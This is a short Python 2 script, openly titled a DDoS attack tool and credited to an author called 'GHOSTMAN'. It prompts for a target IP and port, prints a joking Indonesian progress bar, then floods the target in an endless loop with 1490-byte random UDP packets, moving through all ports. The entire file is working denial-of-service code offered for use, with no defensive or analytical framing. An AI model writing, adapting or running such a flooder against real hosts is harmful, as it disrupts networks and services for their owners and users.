import sys
import os
import time
import socket
import random
#Code Time
from datetime import datetime
now = datetime.now()
hour = now.hour
minute = now.minute
day = now.day
month = now.month
year = now.year

##############
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(1490)
#############

os.system("clear")
os.system("figlet DDos Attack")
print
print "Author   : GHOSTMAN"
print "Blog     : https://blackhydraofficial.blogspot.com/"
print "Github	 : https://github.com/GH05TM4N/"
print "Thank to : MUDASHR HACKS "
print
ip = raw_input("IP Target : ")
port = input("Port       : ")


os.system("clear")
os.system("figlet Attack Starting")
print "[Loading Sayang                               ] 0% "
time.sleep(5)
print "[=====Sabar yah sayang :v                     ] 25%"
time.sleep(5)
print "[==========Hampir masuk sayang		        ] 50%"
time.sleep(5)
print "[===============Udah masuk sayang             ] 75%"
time.sleep(5)
print "[==================Selamat Menikmati sayang :v] 100%"
time.sleep(3)
sent = 0
while True:
     sock.sendto(bytes, (ip,port))
     sent = sent + 1
     port = port + 1
     print "Sent %s packet to %s throught port:%s"%(sent,ip,port)
     if port == 65534:
       port = 1
